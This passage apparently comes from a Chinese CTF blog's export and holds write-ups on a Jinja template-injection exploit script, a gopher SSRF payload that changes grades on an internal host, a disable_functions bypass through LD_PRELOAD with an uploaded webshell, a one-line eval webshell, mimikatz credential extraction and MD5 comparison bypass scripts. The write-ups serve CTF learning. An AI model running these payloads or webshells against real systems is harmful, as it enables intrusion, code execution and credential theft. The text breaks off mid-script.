##\nexp\n```python\nimport requests\nimport re\n\nhost = 'http://cab68c18-4dae-4f19-a5c9-4c4b015acf46.challenge.ctf.show'\n\nurl = f'{host}/madlib'\n\npayload = {\n        \"verb\":\"{%set x=cycler%}\",\n        \"noun\":\"{%set x=x.__init__%}\",\n        \"adjective\":\"{%set x=x.__globals__\",\n        \"person\":\"os.popen('cat f*')%}\",\n        \"place\":\"{{x.read()}}\"\n        }\n\nr = requests.post(url, json=payload)\n\nflag = re.findall(r'ctfshow{.*}', r.text)[0]\n\nprint(flag)\n```\n\n# MISC #\n\n## 中文识别带师 ##\n只有十个汉字，用鼠标写出来百度即可\n要是再多一点就需要用到官方wp中的脚本了\n![](/img/ctfshow/jjb-24.jpg)\n\n# CRYPTO #\n\n## 单向加密 ##\n\nhint是斐波那契\n文本中结尾的`=I2GWRFMO33EWUZM`也是hint，反转后base32解密结果为`fibonacci`\n\n先用脚本跑出斐波那契数列，然后与文本比较，发现是ascii码，转换一下得到flag\n```python\nn=0\na=0\nb=1\nc=1\nfs=['1']\nwhile 1:\n\tc=b+a\n\ta=b\n\tb=c\n\tif n>128:\n\t\tbreak\n\tfs.append(str(b))\n\tn=n+1\nf=open('code.txt')\nd=f.read()\nflag=[]\nl=len(fs)\nwhile len(d)!=0:\n    for i in range(l-1,-1,-1):\n        if d.find(fs[i].strip())==0:\n            print(fs[i].strip(),i+1)\n            flag.append(chr(i+1))\n            d=d[len(fs[i]):]\n            break\nprint(''.join( flag))\n```\n\n![](/img/ctfshow/jjb-25.jpg)\n\n# PWN #\n\n## 炒鸡好玩的井字棋 ##\n根据给的c代码，可以知道基本判断逻辑，检查输入是否小于3，检查是否有负号\n但是没有检测棋子的范围，所以可以下在`-1`这样的位置，用`2^32-1`来输出`-1`\n\n先正常下两个相连的棋子\n[0,0],[0,1]\n![](/img/ctfshow/jjb-26.png)\n\n然后输入[0,4294967295],其实就是[0,-1]\n三个棋子一条线相连，得到flag\n","tags":["wp","ctfshow"],"categories":["wp"]},{"title":"极客挑战2021-misc-wp","url":"/posts/5c5d1357/","content":"\n# 前言 #\n个人感觉有几题出的不是很合理，但还是有收获的\n![](/img/wp/2021/2021jike-misc-1.png)\n\n# In the Air #\n>Intro && Hint: 善于观察藏在身边的 flag， 提示：无线电会在空气中传播\n\n没啥好说的，只有校内能做，WiFI名字就是flag\n![](/img/wp/2021/2021jike-misc-2.png)\n\n# easysend #\n>Intro && Hint: (区块链)描述：请发送0.1Rospten测试币到0x0b896c359adf4bb1c19c7dfd41dc35dc9216e470\n\n使用metamask发送0.1测试币\n![](/img/wp/2021/2021jike-misc-3.png)\n复制hash值到题目连接中验证即可拿到flag\n![](/img/wp/2021/2021jike-misc-4.png)\n\n# 这是什么命令 #\n>Intro && Hint: 命令执行的vps ip为 110.42.233.91 执行的命令 cat flag.png | base64 | base64 | tac | nl | sort -k 2 > flag.txt ;rm -f flag.png & nohup php -S 0.0.0.0:2333 >> /dev/null 2>&1 &\n\n分开来分析\n第一部分`cat flag.png | base64 | base64 | tac | nl | sort -k 2 > flag.txt `\ntac：文件内容倒序输出\nnl：输出文件内容并加上行号\nsort -k 2：将内容从a-z排序后输出\n所以第一条命令的含义就是将flag.png两次base64的值倒序后按A-Z加上行号输出至flag.txt\n\n第二部分`rm -f flag.png & nohup php -S 0.0.0.0:2333 >> /dev/null 2>&1 &`\nrm -r：删除文件\nnohup：不挂断地运行命令\nphp -S：启动内置的web服务器\n所以第二条命令的含义是删除图片，并在后台不间断的运行web服务器，端口为2333\n\n直接访问`http://110.42.233.91:2333/flag.txt`，拿到数据直接上脚本\n```python\nf=open('2333.txt')\nd=f.readlines()\ne=['']*500\nimport base64\nfor i in d:\n    ca=i.strip().split()\n    print(base64.b64decode(ca[1]))\n    e[int(ca[0])]=base64.b64decode(ca[1])\nf=open('2333.png','wb')\n\nf.write(base64.b64decode(''.join(e[::-1])))\nf.close()\nprint('ok')\n```\nflag在解出来的图片上\n\n官方wp：\n```\ncurl http://110.42.233.91:2333/flag.txt | sort -n | tac | awk -F ' ' '{print $2}' | base64 -d | base64 -d > flag.png ; img2txt flag.png --nocolor --nohtml -- maxLen=30\n```\n\n\n\n# easycreat #\n>Intro && Hint: 描述:在Rospten测试链部署一个合约\n\n[单独拿出来写了一篇文章](https://www.lewiserii.top/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%9C%A8Rospten%E6%B5%8B%E8%AF%95%E9%93%BE%E9%83%A8%E7%BD%B2%E4%B8%80%E4%B8%AA%E5%90%88%E7%BA%A6.html)\n提交hash验证即可\n\n# 今天有被破防吗？ #\n>Intro && Hint: 每个人都有决定自己是谁的权力\n\n三个一组的十六进制值，很容易想到RGB\n因为一共有1166400行，是1080的平方数，得出原图片高宽为1080\n脚本还原\n```python\nfrom PIL import Image\na=Image.new('RGB',(1080,1080))\nf=open('ans.txt')\nd=f.readlines()\nd=[tuple([int(i.strip().split()[0],16),int(i.strip().split()[1],16),int(i.strip().split()[2],16)]) for i in d]\na.putdata(d)\na.save('ans.png')\n```\n![](/img/wp/2021/2021jike-misc-5.png)\n可以使用gaps拼图，先用画图量出小区域的高宽\n![](/img/wp/2021/2021jike-misc-6.png)\n\n`gaps --image=1.png  --size=40 --save`\n\n![](/img/wp/2021/2021jike-misc-7.png)\n\n最后垂直翻转一下图片得到flag\n\n\n# 说实话挺好玩的，不是吗？ #\n>Intro && Hint: 你要是觉得好玩，那就玩玩这个\n\n解压后是一个带密码的docx文件\n压缩包中的提示\n![](/img/wp/2021/2021jike-misc-8.png)\n使用john爆破密码\n结果是`767675`，挺坑的，以为是8位数字，爆了两天没出\n![](/img/wp/2021/2021jike-misc-9.png)\n将docx内容复制到txt用十六进制查看，可能是snow加密\n![](/img/wp/2021/2021jike-misc-10.png)\n`snow.exe -C ans.txt`解密文本\n![](/img/wp/2021/2021jike-misc-11.png)\n\n# SGA Character #\n>Intro && Hint: 描述：神秘的语言……仿佛在Minecraft中见过\n\n标准银河字母表\n![](/img/wp/2021/2021jike-misc-12.png)\n\n与题目图片一一对应，解出flag\n\n\n# 圣嘉然 #\n>Intro && Hint: 描述：嘉然,带我走吧！|hints: 1. http://www.atoolbox.net/Category.php?Id=28\n\n在十六进制下观察文件发现rar头被删了一半，补上`52 61 72 21`\n用010打开，发现存在ntfs流隐写\n![](/img/wp/2021/2021jike-misc-13.png)\n导出结果文本\n![](/img/wp/2021/2021jike-misc-14.png)\n有很多emoji表情\n```\n我好想做嘉然👪小姐的狗啊。 可是嘉然小姐说她喜欢的是猫🐘，我👰哭了。 我知道既不是狗也不是猫的我为什么要哭的。因为我其实是一只老鼠\n👣。 我从没奢望嘉然小姐能喜欢自己👴。我明白的，所有人都喜欢理解余裕上手天才打钱的萌萌的狗狗或者猫猫👚，没有人会喜欢阴湿带病的老鼠。 但我还是问了嘉然小姐:“我能不能做你的狗？” 我知道我是注定做不了狗👜的。但如果她喜欢狗，我👲就可以一直在身边看着她了，哪怕她怀里抱着的永远都是狗。 可是她说喜欢的是猫。 她现在还在看着我，还在逗我开心，是因为猫还没有出现，只有我这老鼠每天蹑手蹑脚地从洞👞里爬出来，远远地和她对视。 等她喜欢的猫👛来了的时候，我就该重新滚回我👥的洞了吧。 但我还是好喜欢她👠，她能在我还在她身边的时候多看我几眼吗👘？ 嘉然小姐说接下来的每个圣诞夜都要和大家一起过👘。我不知道大家指哪些人👖。好希望这个集合能够对我做一次胞吞👥。 猫猫👰还在害怕嘉然小姐。 我会去把她爱的猫猫引来的👘。 我👤知道稍有不慎，我就会葬身猫🐘口。 那时候嘉然小姐大概会把我的身体好好地装起来扔到门外👖吧。 那我就成了一包鼠条👰，嘻嘻👜。 我希望她能把我扔得近一点🐧，因为我还是好喜欢她👩。会一直喜欢下去的。 我的灵魂透过窗户向里面看去，挂着的铃铛在轻轻鸣响，嘉然小姐慵懒地靠在沙发上，表演得非常温顺的橘猫坐在她的肩膀👬。壁炉的火光照在她的脸庞，我冻僵的心脏在风里微微发烫👘👖。 —新户眠子\n```\n将表情提取出来解密\n![](/img/wp/2021/2021jike-misc-15.png)\n得到`s!yl}ce{gdniaa_nyam!_ye0rua_`，很明显的w型栅栏\n![](/img/wp/2021/2021jike-misc-16.png)\n\n\n# 每日一溜 #\n>Intro && Hint: 描述：BV1vK4y1p7F5|hints: 1. https://blog.csdn.net/huanghelouzi/article/details/88628590\n\n数据包分析，使用wireshark\n发现POST包，传输了一张png图片\n`ctrl+alt+shift+t`追踪tcp流\n转为原始数据后另存为png\n![](/img/wp/2021/2021jike-misc-17.png)\n用binwalk分离出一个文件\n```\nFhMrPh94JHqS2jGQGM6QCsaDzI6ZyHqQQB==\ndnd4cnN0dW9wcTM0NTY3QUJDREVGR0lISnl6MDIxUFFSU1RLTk1MT1phYmNkVVZXWFllZmdoaWprbG1uODkrLw==\n```\n将第二个base64解密后得到一个base64表，那么第一个base64就是换表加密后的值\n脚本如下\n```python\nimport base64\nimport string\n\nstr1 = \"FhMrPh94JHqS2jGQGM6QCsaDzI6ZyHqQQB==\"\n\nstring1 = \"vwxrstuopq34567ABCDEFGIHJyz021PQRSTKNMLOZabcdUVWXYefghijklmn89+/\"\nstring2 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n\nprint (base64.b64decode(str1.translate(str.maketrans(string1,string2))))\n\n#str1是要解密的代码\n#string1是改过之后的base64表\n```\n\n\n# PANDORA PARADOXXX #\n>Intro && Hint: 描述：为了防止它毁灭世界，我上了层层枷锁……\n\n下载得到一张图片，发现文件中藏了压缩包，binwalk分离\n第二层：标准伪加密，`09`改成`00`\n第三层：纯数字爆破，得到解压密码`513692`\n第四层：发现压缩后hint.txt的crc值与2.zip内hint.txt的crc值一样,可以得出是明文攻击\n![](/img/wp/2021/2021jike-misc-18.png)\n解得口令为`Maimai`\n![](/img/wp/2021/2021jike-misc-19.png)\n第五层：这一个密码属实是没想到，密码为hint中的单词`challenge`\n第六层：解压后就是flag\n\n\n# easyfound #\n>Intro && Hint: 描述：flag在哪里 0xf8e8f25359bbbdea2187c34a8614dbedec083dbb@rospten\n\n\n给了合约源码\n```solidity\ncontract syc{\n    address owner=0x0b896c359adf4bb1c19c7dfd41dc35dc9216e470;\n    bool a=true;\n    bool b=false;\n    uint[] tuple=[0x77,0x88,0x99];\n    strings[] flag=[flag1,flag2];\n}\n```\n这题涉及到区块链的变量存储机制，推荐[一篇文章](https://xz.aliyun.com/t/9837)\n\n代码中一共存储了8个变量，分别是`owner`,`a`,`b`,`0x77`,`0x88`,`0x99`,`flag1`,`flag2`\n在区块链浏览器中查看插槽\n\n`https://ropsten.etherscan.io/tx/0xcf7759b8d59b9c462c5c8a69a30e9b862bee3cbac995d896d58ba8ef592bdafe#statechange`\n\n第一个插槽存储的是地址`owner`\n![](/img/wp/2021/2021jike-misc-20.png)\n第二和第三个插槽存储的是bool变量`a`和`b`\n![](/img/wp/2021/2021jike-misc-21.png)\n第四和第五个插槽存储的是strings类型的变量`flag1`和`flag2`,将两个变量连接到一起就是flag了，注意`$`符号是连接符\n![](/img/wp/2021/2021jike-misc-22.png)\n第六七八存的是`tuple`数组\n![](/img/wp/2021/2021jike-misc-23.png)\n\n\n# 三叶草聚会 #\n>Intro && Hint: 描述: 嘿，我们去聚会吧!拿着你的入门券! | hints: 1.注意题目名称\n\n解压后得到一个key和hint.txt\n从hint.txt中可以知道与git有关，既然知道了密钥，那么就用ssh连接\n先创建一个.ssh文件夹，放入key，创建一个config文件\nconfig文件内容如下\n```\nHost syc\n        HostName github.com\n        User git\n        Port 22\n        IdentityFile ~/.ssh/key\n```\n\n使用`ssh -T syc`连接，获取到用户名为`SycloverParty`\n![](/img/wp/2021/2021jike-misc-24.png)\n\n在github上搜索该用户名，得知有一个私有的仓库`cake`\n![](/img/wp/2021/2021jike-misc-25.png)\n\n`git clone syc:SycloverParty/cake.git`下载下来\n![](/img/wp/2021/2021jike-misc-26.png)\n\n有一个假的flag，使用`git log --pretty=oneline flag`查看文件修改历史\n![](/img/wp/2021/2021jike-misc-27.png)\n\n`git show 7226aee143cc7cd4095337fca6f994848bd9783a`查看历史记录\n![](/img/wp/2021/2021jike-misc-28.png)\n\n\n# EzForensics #\n>Intro && Hint: 简单取证，关键信息在压缩包里,一层一层找出来吧\n\n简单取证题\n先获取镜像信息\n![](/img/wp/2021/2021jike-misc-29.png)\n\n>一： 查看默认浏览器访问过的一个 top后缀的域名 例如xxxxxx.top\n\n先用了`iehistory`命令查看无果\n那么查文件\n找到一个chrome的记录\n![](/img/wp/2021/2021jike-misc-30.png)\n\n下载下来搜索\n得到域名为`3v1l.rigelx.top`\n![](/img/wp/2021/2021jike-misc-31.png)\n\n\n\n\n>二： 另一个浏览器被用来下载了一个文件 找到这个奇怪的文件名 （很怪\n\n查看下载文件夹\n得到可疑文件`L0v3r.f`\n![](/img/wp/2021/2021jike-misc-32.png)\n\n\n>三： 本机的hostname，（计算机名和hostname一般是相同的，但大小写不一样\n\n先`hivelist`看注册表信息地址\n![](/img/wp/2021/2021jike-misc-33.png)\n\n查看`system`\n![](/img/wp/2021/2021jike-misc-34.jpg)\n\n查看`CurrentControlSet`的`value`\n![](/img/wp/2021/2021jike-misc-35.jpg)\n\n查看`ControlSet001`的`value`\n![](/img/wp/2021/2021jike-misc-36.jpg)\n\n继续看`ControlSet001`下的`\\services\\tcpip\\Parameters`\n![](/img/wp/2021/2021jike-misc-37.jpg)\n\n得到主机名`P0tt3r`\n\n\n>四： 登录1里的站点，尝试从镜像中找到用户名和密码（与windows的一致）看看有什么秘密\n\n最后使用`mimikatz`拿到账户和密码\n![](/img/wp/2021/2021jike-misc-38.jpg)\n\n登录站点后自动下载得到一个`secretword.wav`文件\n大概听了一下，是拨号音，[在线解密](https://xiangyuecn.github.io/Recorder/assets/%E5%B7%A5%E5%85%B7-%E4%BB%A3%E7%A0%81%E8%BF%90%E8%A1%8C%E5%92%8C%E9%9D%99%E6%80%81%E5%88%86%E5%8F%91Runtime.html?jsname=teach.dtmf.decode_and_encode)\n得到`10111011100000`\n![](/img/wp/2021/2021jike-misc-39.jpg)\n\n转成摩斯，解密得到`yyds`\n\n>五：拼接后md5\n\n`SYC{md5(3v1l.rigelx.topL0v3r.fP0tt3ryyds)}`\n将上述字段拼接在一起后md5加密一下","tags":["wp","2021竞赛","极客挑战"],"categories":["wp"]},{"title":"极客挑战2021-期末不挂科就算成功-wp","url":"/posts/993a04bf/","content":"\n# 题目描述 #\n>你挂科咯 试试打入学校内网来修改成绩吧(我命由我不由天系列)\n\n可以知道本题需要使用ssrf\n\n# 伪协议 #\n在源代码中发现`debug.php`\n![](/img/wp/2021/2021jike-1.png)\n\n在debug.php中发现可以使用伪协议\n![](/img/wp/2021/2021jike-2.png)\n\n传入`?file=php://filter/convert.base64-encode/resource=debug.php`查看debug.php的源码\n\n```php\n//debug.php关键源码\n<?php\n\n    echo \"<h1>快去学习PHP伪协议</h1>\";\n\terror_reporting(0);\n\t$file=$_GET['file'];\n\tif(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\")){\n\t\techo \"NO！！！\";\n\t\texit();\n\t}\n\tinclude($file);\n\n?>\n```\n\n传入`?file=php://filter/convert.base64-encode/resource=index.php`查看index.php的源码\n\n```php\n//index.php关键代码\n<?php\n$ch = curl_init();\ncurl_setopt($ch, CURLOPT_URL, $_GET['url']);\n#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\n#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);\ncurl_exec($ch);\ncurl_close($ch);\n//你当前位于学校172.17.0.0/24网段下 其实还有台机子里面可以修改成绩 我偷偷告诉你password是123456,name是admin,//result必须要改成60 不然学校会查的！！！\n?>\n```\n\n从index.php中可以得出几个结论：\n1：name为admin，password为123456，result为60\n2：网段是172.17.0.0./24\n\n再用伪协议查看当前主机的敏感文件`/etc/hosts`和`/proc/net/arp`,得到很多内网ip，fuzz一下，得到最终需要的一个内网ip`172.17.0.7`\n![](/img/wp/2021/2021jike-3.png)\n\n# ssrf #\n既然知道了主机等信息，那么就可以开始构造ssrf了，使用gopher协议打\n构造post包\n```\nhttp://106.55.154.252:8010/?url=gopher://172.17.0.7:80/_POST /index.php HTTP/1.1\nHost: 172.17.0.7:80\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 36\n\nname=admin&password=123456&result=60\n```\n将空格，冒号，等于用url编码，结尾换行用`%0d%0a`替换\n```\nhttp://106.55.154.252:8010/?url=gopher://172.17.0.7:80/_POST%20/index.php%20HTTP/1.1%0D%0AHost%3A%20172.17.0.7%3A80%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2036%0D%0A%0D%0Aname%3Dadmin%26password%3D123456%26result%3D60%0D%0A\n```\n二次url编码：将_后的所有字符进行url编码\n```\nhttp://106.55.154.252:8010/?url=gopher://172.17.0.7:80/_%50%4f%53%54%25%32%30%2f%69%6e%64%65%78%2e%70%68%70%25%32%30%48%54%54%50%2f%31%2e%31%25%30%44%25%30%41%48%6f%73%74%25%33%41%25%32%30%31%37%32%2e%31%37%2e%30%2e%37%25%33%41%38%30%25%30%44%25%30%41%43%6f%6e%74%65%6e%74%2d%54%79%70%65%25%33%41%25%32%30%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%25%30%44%25%30%41%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%25%33%41%25%32%30%33%36%25%30%44%25%30%41%25%30%44%25%30%41%6e%61%6d%65%25%33%44%61%64%6d%69%6e%25%32%36%70%61%73%73%77%6f%72%64%25%33%44%31%32%33%34%35%36%25%32%36%72%65%73%75%6c%74%25%33%44%36%30%25%30%44%25%30%41\n```\n\n# 总结 #\n1:换行需要使用`%0d%0a`替换\n2:`/etc/hosts`和`/proc/net/arp`是查看网络信息的敏感文件\n","tags":["wp","2021竞赛","极客挑战","ssrf"],"categories":["wp"]},{"title":"极客挑战2021-breakout-wp","url":"/posts/31724a07/","content":"\n# 题目代码 #\n```php\n<?php\nhighlight_file(__FILE__);\n// 这些奇怪的符号是什么呢?字符串之间还能异或的吗?\n$a = $_POST['v'] ^ '!-__)^';\n// ctf常见的验证码哦!纯数字呢\nif (substr(md5($_POST['auth']),0,6) == \"666666\") {\n    $a($_POST['code']);\n}\n```\n\n# 代码分析 #\n代码会将`v`和`!-__)^`进行异或，所以我们需要构造出一个值，异或后为函数名\n脚本如下\n```python\na=\"!-__)^\"\nb=\"assert\"        //需要的函数名\nc=\"\"\n\nfor i in a:\n    c+=chr(ord(b[len(c)])^ord(i))\nprint(c)\n```\n所以`v`的值就为`@^,:[*`\n![](/img/wp/2021/2021jike-4.png)\n\n接下来是一个MD5的截断比较，找一个MD5后前6位为`666666`的值即可，例如`oT7mgbJMTNyh9qWYQT2d`\n\ncode就是要执行的内容了\n\n现在将三部分连接在一起\n成功执行phpinfo\n![](/img/wp/2021/2021jike-5.png)\n\n# 绕过disable_function #\n有了phpinfo，肯定要看一下`disable_functions`\n可以看到常用的system等基本都被禁用了\n```\npcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,apache_setenv,symlink,link,error_log,iconv\n```\n那么我们就需要绕过`disable_function`\n先用蚁剑连上，方便操作\n![](/img/wp/2021/2021jike-6.png)\n![](/img/wp/2021/2021jike-7.png)\n\n绕过disable_function有很多种方法，但这里大都被禁用了，所以最后采用的是利用 LD_PRELOAD 环境变量来绕过\n首先下载[绕过代码](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)\n需要用到如下这4个文件\n![](/img/wp/2021/2021jike-8.png)\n>bypass_disablefunc.php：一个用来执行命令的 webshell。\n>bypass_disablefunc_x64.so或bypass_disablefunc_x86.so：执行命令的共享对象文件，分为64位的和32位的。\n>bypass_disablefunc.c：用来编译生成上面的共享对象文件。\n\n对于bypass_disablefunc.php，如果有权限就上传到web目录直接访问，无权限的话可以传到tmp目录后用include等函数来包含，并且需要用 GET 方法提供三个参数：\n\ncmd 参数：待执行的系统命令，如 id 命令。\noutpath 参数：保存命令执行输出结果的文件路径（如 /tmp/xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点。\nsopath 参数：指定劫持系统函数的共享对象的绝对路径（如 /var/www/bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。\n\n在回过头来看题目，`/var/www/html`目录是没有权限的，`/tmp`目录可读可写，所以将文件上传到`/tmp`目录下\n![](/img/wp/2021/2021jike-9.png)\n在code中用文件包含调用`bypass_disablefunc.php`\n![](/img/wp/2021/2021jike-10.png)\n然后GET传入三个参数\n![](/img/wp/2021/2021jike-11.png)\n会发现无法执行\n\n检查一下bypass_disablefunc.php中的代码\n![](/img/wp/2021/2021jike-12.png)\n比较后发现`mail(\"\", \"\", \"\", \"\");`中的mail被禁用了\n可以使用`mail`的封装函数`mb_send_mail`来绕过\n![](/img/wp/2021/2021jike-13.png)\n成功绕过\n![](/img/wp/2021/2021jike-14.png)\n执行`ls /`后执行`/readflag`即可拿到flag\n![](/img/wp/2021/2021jike-15.png)\n\n# 绕过open_basedir #\n看到这个环境还不错，顺手试了一下绕过`open_basedir`\n因为是静态靶机，所以能看到其他师傅的马，直接包含，不用在上传了\n```php\n<?php $a=mkdir('/tmp/test');chdir('/tmp/test');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));@eval($_POST[a]); echo 1;\n```\n哈哈哈哈，在线聊天室\n![](/img/wp/2021/2021jike-16.png)\n蚁剑连接\n![](/img/wp/2021/2021jike-17.png)\n可以看到根目录文件了\n![](/img/wp/2021/2021jike-18.png)\n\n\n# 总结 #\n这一题考点很多，并没有表面那么简单，学到很多新姿势\n\n特别鸣谢：[@Hel1antHu5](https://l-helianthus.github.io/)师傅\n参考文章：[绕过Disable Functions来搞事情](https://www.freebuf.com/articles/network/263540.html)\n","tags":["wp","2021竞赛","disable_functions","极客挑战"],"categories":["wp"]},{"title":"在Rospten测试链部署一个合约","url":"/posts/19317a18/","content":"\n\n# 基础准备 #\n首先，需要一个钱包插件`MetaMask`,安装过程就不多说了，百度有很多教程\n选择一个[在线ide](http://remix.ethereum.org/)\n\n\n# 部署合约 #\n首先在默认目录下新建一个文件，注意以sol为后缀名\n![](/img/区块链/部署合约-1.png)\n\n写上你的合约代码\n并选择编译器版本，编译成功后如图所示会出现编译成功的标志\n![](/img/区块链/部署合约-2.png)\n\n最后部署合约，选择“Injected Web3”，表示我们要使用MetaMask注入的Web3环境，如果已正确连接MetaMask，可以看到“Ropsten (3) network”，表示已连接到Ropsten测试网。\n点击deploy后会弹出MetaMask的交易签名确认，确认后部署合约的交易即被发送至测试链\n![](/img/区块链/部署合约-3.png)\n\n在MetaMask中查看合约\n![](/img/区块链/部署合约-4.png)","tags":["基础知识","区块链"],"categories":["区块链"]},{"title":"CTF中关于md5的一些总结","url":"/posts/ad669f62/","content":"\n\n# MD5弱类型比较\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n$a = $_GET['a'];\n$b = $_GET['b'];\nif (isset($_GET['a']) and isset($_GET['b']))\n{\n\tif ($_GET['a'] != $_GET['b'])\n\t{\n\t\tif ((md5($_GET['a']) == md5($_GET['b'])))\n\t\t\techo \"ok\";\n\t\telse\n\t\t\techo \"nonono\";\n\t}\n}\n?>\n```\n\n**方法一：数组绕过**\n\n由于md5不能加密数组，在加密数组的时候会返回NULL，所以我们可以传入两个数组来绕过\n\n\n**方法二：科学计数法绕过**\n\n可以传入两个md5加密后是0e开头的字符串，需要注意的地方是，这个以0e开头的字符串只能是纯数字，这样php在进行科学计算法的时候才会将它转化为0\n\n```text\ns878926199a\n0e545993274517709034328855841020\n\ns155964671a\n0e342768416822451524974117254469\n\ns214587387a\n0e848240448830537924465865611904\n\nQLTHNDT\n0e405967825401955372549139051580\n\nQNKCDZO\n0e830400451993494058024219903391\n\nEEIZDOI\n0e782601363539291779881938479162\n\n240610708\n0e462097431906509019562988736854\n```\n\n\n# MD5强类型比较\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n$a = $_GET['a'];\n$b = $_GET['b'];\nif (isset($_GET['a']) and isset($_GET['b']))\n{\n\tif ($_GET['a'] != $_GET['b'])\n\t{\n\t\tif ((md5($_GET['a']) === md5($_GET['b'])))\n\t\t\techo \"ok\";\n\t\telse\n\t\t\techo \"nonono\";\n\t}\n}\n?>\n```\n\n在`===`的情况下如果没有加类似`is_numeric`的函数进行过滤还是可以使用数组绕过，但是不能使用科学计数法绕过了\n\n\n**方法三：MD5强碰撞**\n\n可以使用`fastcoll`来碰撞出一组内容不同但md5值相同的值\n\n```text\nM%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2\n```\n\n```text\nM%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n```\n\n![](/img/summary/md5-1.png)\n\n\n\n# 双MD5\n\nMD5和双MD5以后的值都是0e开头的\n\n```text\nCbDLytmyGm2xQyaLNhWn\n770hQgrBOjrcqftrlaZk\n7r4lGXCH2Ksu2JNT3BYM\n```\n\n# $md5==md5($md5)\n\n\n```text\n$md5          md5($md5)\n0e00275209979 0e551387587965716321018342879905\n0e00506035745 0e224441551631909369101555335043\n0e00540451811 0e057099852684304412663796608095\n0e00678205148 0e934049274119262631743072394111\n0e00741250258 0e899567782965109269932883593603\n0e00928251504 0e148856674729228041723861799600\n0e01350016114 0e769018222125751782256460324867\n0e01352028862 0e388419153010508575572061606161\n0e01392313004 0e793314107039222217518920037885\n0e01875552079 0e780449305367629893512581736357\n0e01975903983 0e317084484960342086618161584202\n0e02042356163 0e335912055437180460060141819624\n0e02218562930 0e151492820470888772364059321579\n0e02451355147 0e866503534356013079241759641492\n0e02739970294 0e894318228115677783240047043017\n0e02760920150 0e413159393756646578537635311046\n0e02784726287 0e433955189140949269100965859496\n0e03298616350 0e851613188370453906408258609284\n0e03393034171 0e077847024281996293485700020358\n```\n\n爆破脚本\n\n```python\n# -*- coding: utf8 -*-\nimport hashlib\npayload = \"0123456789\"\n\n\ndef calcMd5(s):\n    MD5 = hashlib.md5(s).hexdigest()\n    if MD5[0:2] == \"0e\" and MD5[2:32].isdigit():\n        print s,MD5\n\ndef getStr(payload,s,slen):\n    #print '.',\n    if len(s) == slen:\n        #Custom string\n        calcMd5(s)\n        return s\n    for j in xrange(len(payload)):\n        sl= s+payload[j]\n        getStr(payload,sl,slen)\n\nif __name__ == '__main__':\n    getStr(payload,'0e',13)\n```\n\n# 截断比较(暴力破解)\n\n```php\n<?php\nhighlight_file(__FILE__);\nif (substr(md5($_POST['auth']),0,6) == \"666666\") {\n    echo \"1\";\n} else {\n    echo \"2\";\n}\n?>\n```\n代码中需要md5后前6位为`666666`\n可以通过脚本进行爆破\n脚本如下\n```python\n# -*- coding: utf-8 -*-\n\nimport multiprocessing\nimport hashlib\nimport random\nimport string\nimport sys\n\n\nCHARS = string.letters + string.digits\n\n\ndef cmp_md5(substr, stop_event, str_len, start=0, size=20):\n    global CHARS\n\n    while not stop_event.is_set():\n        rnds = ''.join(random.choice(CHARS) for _ in range(size))\n        md5 = hashlib.md5(rnds)\n\n        if md5.hexdigest()[start: start+str_len] == substr:\n            print rnds\n            stop_event.set()\n\n\nif __name__ == '__main__':\n    substr = sys.argv[1].strip()\n\n    start_pos = int(sys.argv[2]) if len(sys.argv) > 1 else 0\n\n    str_len = len(substr)\n    cpus = multiprocessing.cpu_count()\n    stop_event = multiprocessing.Event()\n    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,\n                                         stop_event, str_len, start_pos))\n                 for i in range(cpus)]\n\n    for p in processes:\n        p.start()\n\n    for p in processes:\n        p.join()\n```\n运行脚本\n第一个参数是需要的字符串，第二个参数是从哪一位开始\n![](/img/summary/md5-2.png)\n验证\n![](/img/summary/md5-3.png)\n\n\n---\n补充一个升级版脚本，支持尾部添加字符串\n例子：\n假设字符串是随机的（指`12ba`和`91e0c`）\n```php\n<?php\nif (substr(md5($_POST['auth'].\"12ba\"),0,5) == \"91e0c\") {\n    echo \"1\";\n} else {\n    echo \"2\";\n}\n?>\n```\n\n\n```\n>python2 md5.py \"91e0c\" 0 12ba\n1KVErD6VijQCd9BrkPEl                 //跑出的值，已经去除结尾\n```\n\n脚本如下\n```python\n# -*- coding: utf-8 -*-\n\nimport multiprocessing\nimport hashlib\nimport random\nimport string\nimport sys\n\n\nCHARS = string.letters + string.digits\n\n\ndef cmp_md5(substr, stop_event, str_len,off, start=0, 